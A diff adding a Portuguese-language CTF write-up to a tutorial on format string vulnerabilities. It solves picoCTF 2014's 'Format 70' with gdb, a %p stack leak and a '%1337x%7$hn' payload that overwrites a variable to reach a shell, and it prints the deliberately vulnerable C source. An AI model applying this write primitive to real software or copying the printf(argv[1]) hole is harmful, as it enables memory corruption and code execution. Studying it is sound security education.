@@ -1,3 +1,4 @@
+
 ﻿# WTF is Format String?
 
 ## Introdução
@@ -117,4 +118,77 @@ E temos o retorno:
 ```bash
 $ you have hit the target correctly :)
 ```
-É muito comum nos challs, esse tipo de desafio ter alguma função pra te retornar a flag, então você exploraria o format string no servidor alvo e ele imprimiria na sua tela a flag, após entender como funciona, sempre é bom praticar e pesquisar write-ups sobre, pois existe uma variedade de formas que isso pode ser implementado em um chall, bons estudos!
+
+## Matando outro chall
+
+ **Problem(Format 70 - picoCTF 2014)**
+ 
+This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! The binary can be found at `/home/format/` on the shell server. The source can be found here(não mais picoctf), agora a source se encontra logo abaixo:
+
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <fcntl.h>
+    
+    int secret = 0;
+    
+    void give_shell(){
+        gid_t gid = getegid();
+        setresgid(gid, gid, gid);
+        system("/bin/sh -i");
+    }
+    
+    int main(int argc, char **argv){
+        int *ptr = &secret;
+        printf(argv[1]);
+    
+        if (secret == 1337){
+            give_shell();
+        }
+        return 0;
+    }
+
+Nós vemos que dessa vez, temos uma variável secret que é declarada como 0, temos uma função give_shell, que é a que precisamos acessar pra poder ter acesso ao shell e pegar a flag, mas a função só será chamada se a variável secret for igual a 1337, de quebra, ainda temos um ponteiro com o endereço de memória de secret, a parte boa aqui, é que temos um **printf(agrv[1])**, esse erro do programador salvará a todos nós, pois poderemos utilizar de format string para explorar esse programa(é só lembrar do que eu disse sobre o printf agora pouco).
+**OBS:** Infelizmente o servidor desse chall já era, até porque esse é um chall do picoctf de 2014.
+
+Podemos analisar o binário com o gdb e ver o valor de memória da variável secret.
+
+```bash
+$ gdb formatstring
+$ p &secret
+```
+(Como o servidor não existe mais, eu peguei o endereço de memória de um write-up no github)
+
+O retorno será esse:
+
+```
+$1 = (<data variable, no debug info> *) 0x804a030 <secret>
+```
+Certo, então temos o endereço de memória, agora precisamos saber onde ele estará quando o programa roda.
+
+Podemos rodar da seguinte forma:
+
+```bash
+$ ./formatstring "%p %p"
+```
+Isso nos retornará os dois próximos endereços de memória da pilha, pois nosso printf(argv[1]) estará imprimindo na nossa tela os %p que estamos passando.
+
+(E já que o writeup está me dando informações privilegiadas aqui, basta rodar sete vezes que teríamos exatamente o endereço de memória que precisamos, mas fingindo que não temos essa informação).
+```bash
+$ ./format "%p %p %p %p %p %p %p %p %p"
+$ 0xffffd7e4 0xffffd7f0 0xf7e4f39d 0xf7fc83c4 0xf7ffd000 0x804852b (0x804a030) 0x8048520 (nil)pico8
+```
+(Foi eu que coloquei o endereço entre parenteses, meu terminal não é uma IA ainda).
+
+Beleza, lá está.
+
+Pra resolver isso, podemos usar o format string %n, ele nos permite escrever no inteiro que o endereço é fornecido como argumento o número de caracteres gravados no buffer(eu juro que tentei procurar uma explicação melhor pro %n, mas na resolução vocês vão entender, ou podem dar uma pesquisada em exemplos).
+Então se nós escrevermos 1337 caracteres usando %1337 e também o endereço de memória de secret com x%7, podemos setar o valor de secret para 1337, então usando um pythonzinho pra entrada de dados temos:
+```bash
+$ ./format $(python -c ‘print “%1337x%7$hn”‘)
+```
+Fazendo isso, secret será igual a 1337, e então a função give_shell() será chamada, nos dando o shell para enfim, digitar um "cat flag.txt" e ter a flag na nossa mão:
+
+```bash
+$ who\_thought\_%n_was_a_good_idea?
+```
+Espero que tenha sido possível ter uma boa base de format string com a explicação e os exemplos, é sempre bom pesquisar e ver outras maneiras em que esse tipo de vulnerabilidade pode cair nos challs, bons estudos!
